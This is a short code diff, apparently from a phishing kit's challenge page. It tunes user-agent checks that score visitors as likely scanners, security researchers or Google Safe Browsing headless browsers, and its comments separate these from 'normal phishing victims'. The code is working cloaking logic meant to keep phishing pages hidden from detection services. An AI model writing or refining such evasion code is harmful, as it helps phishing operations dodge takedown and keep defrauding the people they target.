@@ -1768,13 +1768,13 @@ function challengePage(originalUrl, nonce) {
   // ── NEW: Linux desktop detection ──
   // Normal phishing victims use Windows/Mac/Android/iOS. Linux desktop + Chrome is
   // almost always a scanner, security researcher, or GSB headless browser.
-  var isLinuxDesktop=/X11;\\s*Linux\\s*x86_64/.test(navigator.userAgent)&&!/Android/.test(navigator.userAgent);
+  var isLinuxDesktop=/X11;\\\\s*Linux\\\\s*x86_64/.test(navigator.userAgent)&&!/Android/.test(navigator.userAgent);
   if(isLinuxDesktop&&/Chrome/.test(navigator.userAgent))sc+=30;
 
   // ── NEW: Chrome version anomaly ──
   // GSB headless Chrome uses dev/canary builds with future version numbers.
   // Chrome stable is 149 as of June 2026. Only flag >165 (canary/headless territory).
-  var cvMatch=navigator.userAgent.match(/Chrome\/([0-9]+)/);
+  var cvMatch=navigator.userAgent.match(/Chrome\\\\/([0-9]+)/);
   if(cvMatch){var cv2=parseInt(cvMatch[1]);if(cv2>165)sc+=25;else if(cv2<90)sc+=20;}
 
   // ── NEW: Notification permission probe ──
